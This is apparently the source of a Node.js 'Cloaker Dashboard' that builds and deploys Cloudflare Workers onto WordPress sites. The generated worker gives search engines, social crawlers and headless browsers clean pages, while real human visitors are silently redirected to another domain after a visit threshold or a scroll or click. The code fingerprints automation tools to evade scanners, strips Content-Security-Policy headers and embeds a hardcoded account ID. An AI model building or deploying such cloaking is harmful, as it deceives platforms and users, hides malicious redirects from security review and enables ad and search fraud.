const express = require('express');
const http = require('http');
const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');

const app = express();
const PORT = process.env.PORT || 5050;

// Process Crash Guards
process.on('uncaughtException', (err) => {
  console.error('[Process] Uncaught Exception:', err);
});
process.on('unhandledRejection', (reason, promise) => {
  console.error('[Process] Unhandled Rejection at:', promise, 'reason:', reason);
});

function isBot(ua) {
  if (!ua || typeof ua !== 'string' || ua.length < 15) return true;

  if (/Pinterestbot/i.test(ua) || (ua.includes("Pinterest/") && ua.includes("bot.html"))) {
    return true;
  }

  if (/headlesschrome|puppeteer|playwright|selenium|phantomjs|cypress|webdriver/i.test(ua)) {
    return true;
  }

  if (/googlebot|google-inspectiontool|mediapartners-google|storebot-google|bingbot|bingpreview|msnbot|yandexbot|baiduspider|duckduckbot/i.test(ua)) {
    return true;
  }

  if (/facebookexternalhit|facebot|meta-externalagent|twitterbot|linkedinbot|slackbot|telegrambot|whatsapp|discordbot|applebot|bytespider/i.test(ua)) {
    return true;
  }

  if (/curl\/|wget\/|python-requests|aiohttp|scrapy|node-fetch|axios|go-http-client|urllib|postman/i.test(ua)) {
    return true;
  }

  if (/bot\b|crawler|spider|scraper|preview|archiver/i.test(ua)) {
    return true;
  }

  return false;
}

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use((req, res, next) => {
  req.body = req.body || {};
  next();
});
app.use(express.static(path.join(__dirname, 'public')));

const CONFIG_FILE = path.join(__dirname, 'dashboard-config.json');
const CAMPAIGNS_FILE = path.join(__dirname, 'dashboard-campaigns.json');

// Default Cloudflare D1 Database ID provisioned on account 7dc0e6c5b46881fec4f36bad5ac438a4
const DEFAULT_D1_DATABASE_ID = '7db29aa9-bd12-410d-a982-1600c940a14f';

// Cache: holds the last-known good token so we never block the event loop on every request
let _wranglerTokenCache = null;
let _refreshInProgress = false;
let _lastRefreshAttempt = 0;
const REFRESH_COOLDOWN = 10 * 60 * 1000; // Minimum 10 minutes between background refresh attempts

// Non-blocking async token refresh using wrangler whoami
function _asyncRefreshWranglerToken() {
  if (_refreshInProgress) return;
  if (Date.now() - _lastRefreshAttempt < REFRESH_COOLDOWN) return;
  _refreshInProgress = true;
  _lastRefreshAttempt = Date.now();
  exec('npx wrangler whoami', { timeout: 25000 }, (err) => {
    _refreshInProgress = false;
    // After refresh, re-read the config file and update cache
    try {
      const configPath = path.join(process.env.APPDATA || '', 'xdg.config', '.wrangler', 'config', 'default.toml');
      if (fs.existsSync(configPath)) {
        const content = fs.readFileSync(configPath, 'utf8');
        const tokenMatch = content.match(/oauth_token = "([^"]+)"/);
        if (tokenMatch) {
          _wranglerTokenCache = tokenMatch[1];
          console.log('[Wrangler] Token refreshed successfully.');
        }
      }
    } catch (e) {}
  });
}

// Helper: Read Wrangler token from disk (non-blocking, no execSync)
function getWranglerDefaults() {
  try {
    const configPath = path.join(process.env.APPDATA || '', 'xdg.config', '.wrangler', 'config', 'default.toml');
    if (fs.existsSync(configPath)) {
      const content = fs.readFileSync(configPath, 'utf8');
      const tokenMatch = content.match(/oauth_token = "([^"]+)"/);
      const token = tokenMatch ? tokenMatch[1] : '';

      // Check expiry and kick off a background refresh if needed (non-blocking with cooldown)
      const expMatch = content.match(/expiration_time = "([^"]+)"/);
      if (expMatch) {
        const expTime = new Date(expMatch[1]).getTime();
        // Refresh proactively only if token expires within 10 minutes and not on cooldown
        if (Date.now() > expTime - 10 * 60 * 1000) {
          _asyncRefreshWranglerToken();
        }
      }

      if (token) _wranglerTokenCache = token;
      return {
        token: _wranglerTokenCache || token,
        accountId: '7dc0e6c5b46881fec4f36bad5ac438a4'
      };
    }
  } catch (e) {}
  return { token: _wranglerTokenCache || '', accountId: '7dc0e6c5b46881fec4f36bad5ac438a4' };
}

// Async version for endpoints that need a guaranteed fresh token (e.g. after auth failure)
async function getWranglerDefaultsFresh() {
  // Cooldown guard: if refreshed within last 15s, re-read disk directly
  if (Date.now() - _lastRefreshAttempt < 15000 && _wranglerTokenCache) {
    return getWranglerDefaults();
  }
  _lastRefreshAttempt = Date.now();
  return new Promise((resolve) => {
    exec('npx wrangler whoami', { timeout: 25000 }, () => {
      resolve(getWranglerDefaults());
    });
  });
}

function loadConfig() {
  const defaults = getWranglerDefaults();
  let cfg = {};
  if (fs.existsSync(CONFIG_FILE)) {
    try {
      cfg = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8'));
    } catch (e) {}
  }

  let fallbackThreshold = 8;
  try {
    const campaigns = loadCampaigns();
    const active = campaigns.find(c => c.status === 'active' && c.thresholdCount);
    if (active) fallbackThreshold = active.thresholdCount;
  } catch(e) {}

  return {
    apiToken: defaults.token || cfg.apiToken || '',
    accountId: cfg.accountId || defaults.accountId || '7dc0e6c5b46881fec4f36bad5ac438a4',
    d1DatabaseId: cfg.d1DatabaseId || DEFAULT_D1_DATABASE_ID,
    activationMethod: cfg.activationMethod || 'visitor_threshold', // 'trigger' (Method 1) or 'visitor_threshold' (Method 2)
    defaultScrollPct: cfg.defaultScrollPct || 15,
    defaultTrigger: cfg.defaultTrigger || 'both',
    thresholdCount: cfg.thresholdCount || fallbackThreshold || 8,
    autoCreateWww: cfg.autoCreateWww !== false
  };
}

function saveConfig(cfg) {
  fs.writeFileSync(CONFIG_FILE, JSON.stringify(cfg, null, 2), 'utf8');
}

function loadCampaigns() {
  if (fs.existsSync(CAMPAIGNS_FILE)) {
    try {
      return JSON.parse(fs.readFileSync(CAMPAIGNS_FILE, 'utf8'));
    } catch (e) {}
  }
  return [
    {
      id: 'homeandrecipe-cloaker',
      sourceDomain: 'homeandrecipe.com',
      targetDomain: 'https://asqstyle.com',
      workerName: 'homeandrecipe-cloaker',
      activationMethod: 'visitor_threshold',
      triggerCondition: 'both',
      scrollPct: 15,
      thresholdCount: 4,
      routes: ['homeandrecipe.com/*', 'www.homeandrecipe.com/*'],
      deployedAt: new Date().toISOString(),
      status: 'active'
    }
  ];
}

function saveCampaigns(campaigns) {
  fs.writeFileSync(CAMPAIGNS_FILE, JSON.stringify(campaigns, null, 2), 'utf8');
}

// Generate Worker Code Dynamically using ONE chosen method:
// Either Method 1 (Human Verification Trigger Condition) OR Method 2 (Unique Human Visitor Engine)
function buildWorkerCode({
  sourceDomain,
  targetDomain,
  activationMethod = 'visitor_threshold', // 'trigger' (Method 1) OR 'visitor_threshold' (Method 2)
  scrollPct = 0.15,
  triggerCondition = 'both',    // 'scroll', 'click', or 'both'
  thresholdCount = 4,           // Unique humans per 24h for Method 2
  sitemaps = [],
  blockThemes = true
}) {
  const cleanTarget = targetDomain.replace(/^https?:\/\//i, '').replace(/\/+$/, '');
  const cleanSource = sourceDomain.replace(/^https?:\/\//i, '').replace(/\/+$/, '');
  const isVisitorThreshold = activationMethod === 'visitor_threshold';
  
  const sitemapDirectives = (sitemaps.length > 0 ? sitemaps : [
    `https://${cleanSource}/wp-sitemap.xml`,
    `https://${cleanSource}/sitemap.xml`
  ]).map(sm => `Sitemap: ${sm.startsWith('http') ? sm : 'https://' + sm}`).join('\\n');

  return `/**
 * Cloudflare Cloaker Worker for ${cleanSource}
 * Generated automatically by Cloaker Dashboard
 * Target Host: ${cleanTarget}
 * Active Method: ${isVisitorThreshold ? `Unique Human Visitor Threshold (${thresholdCount} humans/24h)` : `Human Verification Trigger (${triggerCondition.toUpperCase()})`}
 */

const ACTIVATION_METHOD = "${activationMethod}"; // 'trigger' or 'visitor_threshold'
const TARGET_HOST = "${cleanTarget}";
const SCROLL_PCT  = ${scrollPct};
const TRIGGER_MODE = "${triggerCondition}"; // 'scroll', 'click', or 'both'
const THRESHOLD_COUNT = ${parseInt(thresholdCount, 10) || 4};

function isBot(ua) {
  if (!ua || ua.length < 15) return true;

  if (/Pinterestbot/i.test(ua) || (ua.includes("Pinterest/") && ua.includes("bot.html"))) {
    return true;
  }

  if (/headlesschrome|puppeteer|playwright|selenium|phantomjs|cypress|webdriver/i.test(ua)) {
    return true;
  }

  if (/googlebot|google-inspectiontool|mediapartners-google|storebot-google|bingbot|bingpreview|msnbot|yandexbot|baiduspider|duckduckbot/i.test(ua)) {
    return true;
  }

  if (/facebookexternalhit|facebot|meta-externalagent|twitterbot|linkedinbot|slackbot|telegrambot|whatsapp|discordbot|applebot|bytespider/i.test(ua)) {
    return true;
  }

  if (/curl\\/|wget\\/|python-requests|aiohttp|scrapy|node-fetch|axios|go-http-client|urllib|postman/i.test(ua)) {
    return true;
  }

  if (/bot\\b|crawler|spider|scraper|preview|archiver/i.test(ua)) {
    return true;
  }

  return false;
}

export default {
  // Scheduled Cron Handler: Runs daily to purge stale visits older than 48 hours (when Method 2 is used)
  async scheduled(event, env, ctx) {
    if (env.DB) {
      try {
        await env.DB.prepare("DELETE FROM url_human_visits WHERE visited_at < datetime('now', '-48 hours')").run();
        console.log("[CF Worker] Purged visits older than 48 hours");
      } catch (err) {
        console.error("[CF Worker] Scheduled purge error:", err);
      }
    }
  },

  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const ua = request.headers.get("user-agent") || "";

    // 1. DYNAMIC ROBOTS.TXT: Disallows /themes/ without exposing script names
    if (url.pathname === "/robots.txt") {
      const robots = [
        "# Explicitly allow Pinterest's web crawler full access to pages and images",
        "User-agent: Pinterestbot",
        "Allow: /",
        "Disallow: /themes/",
        "Disallow: /wp-admin/",
        "Disallow: /search/",
        "",
        "# Allow all standard search engine crawlers",
        "User-agent: *",
        "Allow: /",
        "Disallow: /themes/",
        "Disallow: /wp-admin/",
        "Allow: /wp-admin/admin-ajax.php",
        "Disallow: /wp-includes/",
        "Disallow: /search/",
        "Disallow: /*?s=",
        "",
        "# Direct crawlers to sitemaps",
        "${sitemapDirectives}"
      ].join("\\n");

      return new Response(robots, {
        headers: {
          "Content-Type": "text/plain; charset=utf-8",
          "Cache-Control": "no-store, no-cache, must-revalidate"
        }
      });
    }

    // 2. HARD BLOCK ON /themes/ FOR BOTS
    ${blockThemes ? `if (url.pathname.startsWith("/themes/")) {
      if (isBot(ua)) {
        return new Response("Forbidden", { status: 403 });
      }
    }` : ''}

    if (request.method !== "GET") return fetch(request);

    // 3. STATIC ASSETS BYPASS (Stylesheets, images, fonts, scripts)
    if (/\\.(jpg|jpeg|png|gif|webp|svg|css|js|woff|woff2|ttf|eot|ico|json|xml)$/i.test(url.pathname)) {
      return fetch(request);
    }

    // 4. BOT ROUTING: Crawlers get pure, clean origin HTML (Zero DB writes, zero redirection)
    if (isBot(ua)) {
      return fetch(request);
    }

    const postPath = url.pathname.endsWith("/") ? url.pathname : url.pathname + "/";

    // =========================================================================
    // METHOD 2: 24-HOUR UNIQUE HUMAN VISITOR THRESHOLD ENGINE
    // =========================================================================
    if (ACTIVATION_METHOD === 'visitor_threshold') {
      let uniqueHumanCount24h = 0;

      if (env.DB) {
        try {
          const clientIp = request.headers.get("cf-connecting-ip") || "0.0.0.0";
          const country = request.headers.get("cf-ipcountry") || "XX";

          // Use cookie if present, otherwise IP + UA fingerprint
          const cookieHeader = request.headers.get("cookie") || "";
          let visitorId = "";
          const cookieMatch = cookieHeader.match(/cf_uv_id=([^;]+)/);
          if (cookieMatch) {
            visitorId = cookieMatch[1];
          } else {
            visitorId = clientIp + "::" + ua;
          }

          const rawId = visitorId + "::cloaker-salt";
          const msgBuffer = new TextEncoder().encode(rawId);
          const hashBuffer = await crypto.subtle.digest("SHA-256", msgBuffer);
          const visitorHash = Array.from(new Uint8Array(hashBuffer))
            .map(b => b.toString(16).padStart(2, "0"))
            .join("")
            .substring(0, 32);

          // AWAIT the insert so this current visitor is recorded BEFORE counting
          try {
            await env.DB.prepare(
              "INSERT INTO url_human_visits (post_path, visitor_hash, visited_at, country) VALUES (?1, ?2, datetime('now'), ?3)"
            ).bind(postPath, visitorHash, country).run();
          } catch (insertErr) {}

          // Continuous Rolling 24-Hour Human Visit Query (Counts every human visit to this slug; resets after 24h)
          const countRow = await env.DB.prepare(
            "SELECT COUNT(*) as cnt FROM url_human_visits WHERE post_path = ?1 AND visited_at >= datetime('now', '-24 hours')"
          ).bind(postPath).first();

          uniqueHumanCount24h = (countRow && countRow.cnt) ? countRow.cnt : 0;
        } catch (dbErr) {
          console.error("[CF Worker] DB threshold error:", dbErr);
        }
      }

      // GATEKEEPER: If visits in 24h are below threshold (e.g. < 4):
      // Serve clean WordPress article HTML with ZERO redirection scripts!
      // Must prevent browser caching so subsequent visits reach Worker & counter increments!
      if (uniqueHumanCount24h < THRESHOLD_COUNT) {
        const subOrigin = await fetch(request, { cf: { cacheEverything: false } });
        const subHeaders = new Headers(subOrigin.headers);
        subHeaders.set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0");
        subHeaders.set("Pragma", "no-cache");
        return new Response(subOrigin.body, {
          status: subOrigin.status,
          headers: subHeaders
        });
      }
    }

    // =========================================================================
    // FETCH ORIGIN FOR HUMAN VISITOR (Activates Redirection)
    // =========================================================================
    const origin = await fetch(request, { cf: { cacheEverything: false } });
    const ct = origin.headers.get("content-type") || "";
    const dest = \`https://\${TARGET_HOST}\${postPath}\${url.search}\`;

    if (!ct.includes("text/html")) {
      return Response.redirect(dest, 302);
    }

    // Inject Human Verification & Anti-Automation Script
    const inject = \`
<script>
(function() {
    var target = "\${dest}";
    var done = false;
    var botDetected = false;
    var ACTIVATION_METHOD = "\${ACTIVATION_METHOD}"; // 'trigger' or 'visitor_threshold'
    var TRIGGER_MODE = "\${TRIGGER_MODE}"; // 'scroll', 'click', or 'both'

    // Multi-layer Automation & Bot Detection
    function scanAutomation() {
        if (botDetected) return true;

        // 1. Direct webdriver flag: strictly check if true (automated tool)
        if (navigator.webdriver === true) {
            botDetected = true;
            return true;
        }

        // 2. Headless desktop detection (Ignore touch devices like iPhones/Android where outerWidth is naturally 0)
        var isTouchDevice = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
        if (!isTouchDevice && window.outerWidth === 0 && window.outerHeight === 0 && window.screen && window.screen.width === 0) {
            botDetected = true;
            return true;
        }

        // 3. Execution stack inspection for CDP / Playwright / Puppeteer
        try {
            var s = (new Error()).stack || "";
            if (s.includes("UtilityScript") || s.includes("playwright") || s.includes("puppeteer") || s.includes("evaluate (:")) {
                botDetected = true;
                return true;
            }
        } catch(e) {}

        // 4. Automation globals & attributes
        if (window.__playwright || window.playwright || window.__pw_init || window.__pw_manual) {
            botDetected = true;
            return true;
        }
        if (window.__puppeteer_evaluation_script__ || window.puppeteer) {
            botDetected = true;
            return true;
        }
        if (window.__selenium_evaluate || window._phantom || window.callPhantom) {
            botDetected = true;
            return true;
        }
        if (window.__nightmare || window.domAutomation || window.domAutomationController) {
            botDetected = true;
            return true;
        }

        // 5. Headless Chrome detection (Strictly headless, never real Chrome builds)
        var uaStr = navigator.userAgent || "";
        if (uaStr.indexOf("HeadlessChrome") !== -1) {
            botDetected = true;
            return true;
        }

        if (document.documentElement && (document.documentElement.getAttribute("webdriver") || document.documentElement.getAttribute("selenium"))) {
            botDetected = true;
            return true;
        }

        if (!navigator.languages || navigator.languages.length === 0) {
            botDetected = true;
            return true;
        }

        return false;
    }

    scanAutomation();

    // Reset scroll restoration so browsers start at the top
    try {
        if ('scrollRestoration' in history) {
            history.scrollRestoration = 'manual';
        }
    } catch(e) {}

    // Track real human presence across ALL device types
    var humanActive = false;
    function markHuman(e) {
        if (!e || e.isTrusted) {
            humanActive = true;
        }
    }

    // Capture human events: mouse, touch, pointer, keyboard, wheel
    window.addEventListener("mousemove", markHuman, { passive: true, capture: true });
    window.addEventListener("pointerdown", markHuman, { passive: true, capture: true });
    window.addEventListener("pointermove", markHuman, { passive: true, capture: true });
    window.addEventListener("touchstart", markHuman, { passive: true, capture: true });
    window.addEventListener("touchmove", markHuman, { passive: true, capture: true });
    window.addEventListener("keydown", markHuman, { passive: true, capture: true });
    window.addEventListener("wheel", function(e) {
        if (!e || e.isTrusted) {
            humanActive = true;
        }
    }, { passive: true, capture: true });

    function triggerRedirect(reason) {
        if (done) return;

        if (scanAutomation() || botDetected) {
            done = true;
            console.log("[CF Worker] Automated browser detected. Redirect disabled.");
            return;
        }

        done = true;
        console.log("[CF Worker] Human redirect triggered by:", reason, "-> Target:", target);
        try {
            window.location.replace(target);
        } catch(e) {}
        window.location.href = target;
    }

    // -------------------------------------------------------------------------
    // IF METHOD 2 (Unique Human Visitor): Threshold Reached -> Immediate Redirect
    // -------------------------------------------------------------------------
    if (ACTIVATION_METHOD === 'visitor_threshold') {
        function onThresholdRedirect(reason) {
            if (done) return;
            if (scanAutomation() || botDetected) return;
            triggerRedirect(reason);
        }

        // Instant redirect on any real human interaction:
        window.addEventListener("click", function(e) {
            if (e && e.isTrusted) {
                if (e.preventDefault) e.preventDefault();
                onThresholdRedirect("Human Click (Threshold Reached)");
            }
        }, { capture: true });

        window.addEventListener("touchstart", function(e) {
            if (e && e.isTrusted) {
                onThresholdRedirect("Human TouchStart (Threshold Reached)");
            }
        }, { capture: true, passive: true });

        window.addEventListener("touchend", function(e) {
            if (e && e.isTrusted) {
                onThresholdRedirect("Human Touch (Threshold Reached)");
            }
        }, { capture: true });

        window.addEventListener("pointerdown", function(e) {
            if (e && e.isTrusted) {
                onThresholdRedirect("Human PointerDown (Threshold Reached)");
            }
        }, { capture: true });

        window.addEventListener("pointermove", function(e) {
            if (e && e.isTrusted) {
                onThresholdRedirect("Human PointerMove (Threshold Reached)");
            }
        }, { passive: true });

        window.addEventListener("mousemove", function(e) {
            if (e && e.isTrusted) {
                onThresholdRedirect("Human MouseMove (Threshold Reached)");
            }
        }, { passive: true });

        window.addEventListener("wheel", function(e) {
            if (e && e.isTrusted) {
                onThresholdRedirect("Human Wheel (Threshold Reached)");
            }
        }, { passive: true });

        window.addEventListener("scroll", function() {
            onThresholdRedirect("Human Scroll (Threshold Reached)");
        }, { passive: true });

        window.addEventListener("keydown", function(e) {
            if (e && e.isTrusted) {
                onThresholdRedirect("Human KeyDown (Threshold Reached)");
            }
        }, { passive: true });
    }

    // -------------------------------------------------------------------------
    // IF METHOD 1 (Human Verification Trigger Condition): Respect Chosen Trigger
    // -------------------------------------------------------------------------
    if (ACTIVATION_METHOD === 'trigger') {
        // CONDITION 1: CLICK / TAP TRIGGER
        if (TRIGGER_MODE === 'click' || TRIGGER_MODE === 'both') {
            function onHumanClick(e) {
                if (done) return;
                if (scanAutomation() || botDetected) return;
                if (!e || !e.isTrusted) return; // Discard synthetic programmatic clicks

                e.preventDefault();
                e.stopPropagation();
                triggerRedirect("Human Click/Tap");
            }
            window.addEventListener("click", onHumanClick, { capture: true });
            window.addEventListener("touchend", onHumanClick, { capture: true });
        }

        // CONDITION 2: SCROLL TRIGGER
        if (TRIGGER_MODE === 'scroll' || TRIGGER_MODE === 'both') {
            function getScroll() {
                return window.scrollY || window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
            }

            function getHeight() {
                return Math.max(
                    document.body.scrollHeight, document.documentElement.scrollHeight,
                    document.body.offsetHeight, document.documentElement.offsetHeight,
                    document.body.clientHeight, document.documentElement.clientHeight
                );
            }

            var startY = getScroll();

            function checkScroll() {
                if (done) return;
                if (scanAutomation() || botDetected) return;
                if (!humanActive) return;

                var top = getScroll();
                // Ensure the user actually scrolled down from where they started
                if (top <= startY) return;

                var height = getHeight();
                var view = window.innerHeight || document.documentElement.clientHeight;
                var max = height - view;

                if (max > 50) { 
                    var pct = top / max;
                    if (pct >= \${SCROLL_PCT}) {
                        triggerRedirect("Human Scroll (" + Math.round(pct * 100) + "%)");
                    }
                } else if (top > 60) {
                    triggerRedirect("Fallback Scroll");
                }
            }

            window.addEventListener("scroll", checkScroll, { passive: true });
        }
    }

    console.log("[CF Worker] Cloaker Active (Method: " + ACTIVATION_METHOD + " | Trigger: " + TRIGGER_MODE + "). Target:", target);
})();
</script>\`;

    let injected = false;
    const transformed = new HTMLRewriter()
      .on("head", {
        element(el) {
          if (!injected) {
            el.prepend(inject, { html: true });
            injected = true;
          }
        }
      })
      .on("body", {
        element(el) {
          if (!injected) {
            el.prepend(inject, { html: true });
            injected = true;
          }
        }
      })
      .transform(origin);

    const headers = new Headers(transformed.headers);
    headers.set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0");
    headers.set("Vary", "User-Agent");
    headers.delete("content-security-policy");
    headers.delete("content-security-policy-report-only");
    headers.delete("content-length");

    return new Response(transformed.body, {
      status: 200,
      headers: headers
    });
  }
};
`;
}

// Generate Robots.txt Text
function buildRobotsTxt({ sourceDomain, sitemaps = [] }) {
  const cleanSource = sourceDomain.replace(/^https?:\/\//i, '').replace(/\/+$/, '');
  const sitemapLines = (sitemaps.length > 0 ? sitemaps : [
    `https://${cleanSource}/wp-sitemap.xml`,
    `https://${cleanSource}/sitemap.xml`
  ]).map(sm => `Sitemap: ${sm.startsWith('http') ? sm : 'https://' + sm}`).join('\n');

  return `# Explicitly allow Pinterest's web crawler full access to pages and images
User-agent: Pinterestbot
Allow: /
Disallow: /themes/
Disallow: /wp-admin/
Disallow: /search/

# Allow all standard search engine crawlers (Google, Bing, etc.)
User-agent: *
Allow: /
Disallow: /themes/
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
Disallow: /wp-includes/
Disallow: /search/
Disallow: /*?s=

# Direct crawlers to your sitemaps for faster discovery
${sitemapLines}
`;
}

// Health Check Routes
app.get(['/health', '/api/health'], (req, res) => {
  res.status(200).json({
    status: 'ok',
    uptime: process.uptime(),
    timestamp: new Date().toISOString()
  });
});

// Serve favicon to prevent 404 noise
app.get('/favicon.ico', (req, res) => {
  res.set('Content-Type', 'image/svg+xml');
  res.set('Cache-Control', 'public, max-age=86400');
  res.send('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#10b981"/><text x="16" y="22" font-size="18" text-anchor="middle" fill="white" font-family="sans-serif">C</text></svg>');
});

// API: Get Config
app.get('/api/config', (req, res) => {
  res.json(loadConfig());
});

// API: Save Config
app.post('/api/config', (req, res) => {
  const { apiToken, accountId, d1DatabaseId, activationMethod, defaultScrollPct, defaultTrigger, thresholdCount, autoCreateWww } = req.body || {};
  const cfg = {
    apiToken: apiToken || '',
    accountId: accountId || '',
    d1DatabaseId: d1DatabaseId || DEFAULT_D1_DATABASE_ID,
    activationMethod: activationMethod === 'visitor_threshold' ? 'visitor_threshold' : 'trigger',
    defaultScrollPct: defaultScrollPct || 15,
    defaultTrigger: defaultTrigger || 'both',
    thresholdCount: parseInt(thresholdCount, 10) || 50,
    autoCreateWww: autoCreateWww !== false
  };
  saveConfig(cfg);
  res.json({ success: true, config: cfg });
});

// Helper to detect any Cloudflare auth/token error (expired, invalid, unauthorized)
function isCfAuthError(cfData, httpStatus) {
  if (httpStatus === 401 || httpStatus === 403) return true;
  if (!cfData || cfData.success) return false;
  const err = cfData.errors?.[0];
  if (!err) return false;
  const code = err.code;
  const msg = (err.message || '').toLowerCase();
  return code === 10000 || code === 9109 || code === 6003 ||
         msg.includes('authentication') || msg.includes('invalid access token') ||
         msg.includes('token expired') || msg.includes('unauthorized') ||
         msg.includes('invalid request headers');
}

let _cachedVerify = null;
let _cachedVerifyTime = 0;

// Helper to verify Cloudflare credentials
async function verifyCloudflare(apiToken, accountId) {
  let token = apiToken;
  if (!token) {
    const defaults = getWranglerDefaults();
    token = defaults.token;
  }
  if (!token) {
    return { success: false, message: 'Cloudflare API Token is required' };
  }

  try {
    let accRes = await fetch('https://api.cloudflare.com/client/v4/accounts', {
      headers: { Authorization: `Bearer ${token}` },
      signal: AbortSignal.timeout(10000)
    });
    let accData = await accRes.json();

    // Self-healing: if token expired or invalid, auto-refresh via Wrangler
    if (isCfAuthError(accData, accRes.status)) {
      const fresh = await getWranglerDefaultsFresh();
      if (fresh.token) {
        token = fresh.token;
        accRes = await fetch('https://api.cloudflare.com/client/v4/accounts', {
          headers: { Authorization: `Bearer ${token}` },
          signal: AbortSignal.timeout(10000)
        });
        accData = await accRes.json();
      }
    }

    if (!accData.success) {
      return {
        success: false,
        message: accData.errors?.[0]?.message || 'Invalid Cloudflare API Token'
      };
    }

    const accounts = accData.result || [];
    let selectedAccount = accounts.find(a => a.id === accountId) || accounts[0];

    let zonesCount = 0;
    try {
      const zRes = await fetch('https://api.cloudflare.com/client/v4/zones?per_page=50', {
        headers: { Authorization: `Bearer ${token}` },
        signal: AbortSignal.timeout(10000)
      });
      const zData = await zRes.json();
      if (zData.success) {
        zonesCount = zData.result.length;
      }
    } catch(e) {}

    const result = {
      success: true,
      account: selectedAccount,
      accounts: accounts,
      zonesCount: zonesCount,
      freshToken: token,
      message: 'Connected to Cloudflare successfully'
    };

    _cachedVerify = result;
    _cachedVerifyTime = Date.now();
    return result;
  } catch (error) {
    return { success: false, message: error.message };
  }
}

// API: Verify Cloudflare Connection (cached & fast)
app.post('/api/verify-cf', async (req, res) => {
  const { apiToken, accountId, forceRefresh } = req.body || {};
  const currentToken = apiToken || getWranglerDefaults().token;

  // Serve cached result if fresh (< 2 mins) and token matches
  if (!forceRefresh && _cachedVerify && (Date.now() - _cachedVerifyTime < 120000) && _cachedVerify.freshToken === currentToken) {
    return res.json(_cachedVerify);
  }

  const result = await verifyCloudflare(apiToken, accountId);
  res.status(result.success ? 200 : 400).json(result);
});

// API: List Zones/Domains from Cloudflare
app.get('/api/zones', async (req, res) => {
  const cfg = loadConfig();
  let token = req.query.token || cfg.apiToken;
  if (!token) {
    return res.status(400).json({ success: false, message: 'No API Token configured' });
  }

  try {
    let zRes = await fetch('https://api.cloudflare.com/client/v4/zones?per_page=50', {
      headers: { Authorization: `Bearer ${token}` }
    });
    let zData = await zRes.json();
    
    // Auto-refresh token if expired (non-blocking async)
    if (isCfAuthError(zData, zRes.status)) {
      const fresh = await getWranglerDefaultsFresh();
      if (fresh.token) {
        token = fresh.token;
        zRes = await fetch('https://api.cloudflare.com/client/v4/zones?per_page=50', {
          headers: { Authorization: `Bearer ${token}` }
        });
        zData = await zRes.json();
      }
    }

    if (!zData.success) {
      return res.status(400).json({ success: false, message: zData.errors?.[0]?.message || 'Failed to fetch zones' });
    }
    const zones = zData.result.map(z => ({
      id: z.id,
      name: z.name,
      status: z.status,
      paused: z.paused
    }));
    res.json({ success: true, zones, freshToken: token });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// API: Generate Code Preview
app.post('/api/generate', (req, res) => {
  try {
    const {
      sourceDomain,
      targetDomain,
      activationMethod = 'visitor_threshold',
      scrollPct,
      triggerCondition = 'both',
      thresholdCount = 4,
      sitemaps,
      blockThemes
    } = req.body || {};

    if (!sourceDomain || !targetDomain) {
      return res.status(400).json({ success: false, message: 'Source and Target domains are required' });
    }

    const code = buildWorkerCode({
      sourceDomain,
      targetDomain,
      activationMethod,
      scrollPct: (scrollPct || 15) / 100,
      triggerCondition,
      thresholdCount,
      sitemaps,
      blockThemes: blockThemes !== false
    });
    const robots = buildRobotsTxt({ sourceDomain, sitemaps });

    res.json({
      success: true,
      workerCode: code,
      robotsTxt: robots
    });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// API: Deploy Worker and Setup Routes with D1 Binding (Self-Healing Auto-Token Refresh)
app.post('/api/deploy', async (req, res) => {
  const logs = [];
  function log(msg, type = 'info') {
    logs.push({ time: new Date().toLocaleTimeString(), message: msg, type });
  }

  try {
    const {
      sourceDomain,
      targetDomain,
      workerName,
      activationMethod = 'visitor_threshold',
      scrollPct = 15,
      triggerCondition = 'both',
      thresholdCount = 4,
      apiToken,
      accountId,
      includeWww = true,
      sitemaps = []
    } = req.body || {};

    const cfg = loadConfig();
    let token = apiToken || cfg.apiToken;
    const account = accountId || cfg.accountId;
    const d1DatabaseId = cfg.d1DatabaseId || DEFAULT_D1_DATABASE_ID;

    if (!token || !account) {
      return res.status(400).json({ success: false, message: 'Cloudflare API Token and Account ID are required.' });
    }

    if (!sourceDomain || !targetDomain) {
      return res.status(400).json({ success: false, message: 'Source Domain and Target Domain are required.' });
    }

    const cleanSource = sourceDomain.replace(/^https?:\/\//i, '').replace(/\/+$/, '').toLowerCase();
    const finalWorkerName = (workerName || `${cleanSource.replace(/[^a-z0-9]/g, '-')}-cloaker`).toLowerCase();
    const numScrollPct = (parseInt(scrollPct, 10) || 15) / 100;
    const numThreshold = parseInt(thresholdCount, 10) || 4;

    const methodName = activationMethod === 'visitor_threshold' ? 
      `Unique Human Visitor (${numThreshold}/24h)` : 
      `Human Verification Trigger (${triggerCondition.toUpperCase()})`;

    log(`[1/5] Compiling Worker for ${cleanSource} using ONE Method: [${methodName}]...`, 'step');
    const workerCode = buildWorkerCode({
      sourceDomain: cleanSource,
      targetDomain,
      activationMethod,
      scrollPct: numScrollPct,
      triggerCondition,
      thresholdCount: numThreshold,
      sitemaps,
      blockThemes: true
    });

    log(`[2/5] Binding D1 Database & Uploading Worker '${finalWorkerName}'...`, 'step');
    
    function createUploadForm() {
      const form = new FormData();
      const metadata = {
        main_module: 'worker.js',
        compatibility_date: '2026-10-31',
        bindings: [
          {
            type: 'd1',
            name: 'DB',
            id: d1DatabaseId
          }
        ]
      };
      form.append('metadata', JSON.stringify(metadata));
      form.append('worker.js', new Blob([workerCode], { type: 'application/javascript+module' }), 'worker.js');
      return form;
    }

    let uploadRes = await fetch(`https://api.cloudflare.com/client/v4/accounts/${account}/workers/scripts/${finalWorkerName}`, {
      method: 'PUT',
      headers: { Authorization: `Bearer ${token}` },
      body: createUploadForm()
    });
    let uploadData = await uploadRes.json();

    // Self-Healing: Auto-refresh OAuth token if Cloudflare returns Authentication error
    if (isCfAuthError(uploadData, uploadRes.status)) {
      log('OAuth token expired. Auto-refreshing credentials via Wrangler...', 'info');
      const fresh = await getWranglerDefaultsFresh();
      if (fresh.token) {
        token = fresh.token;
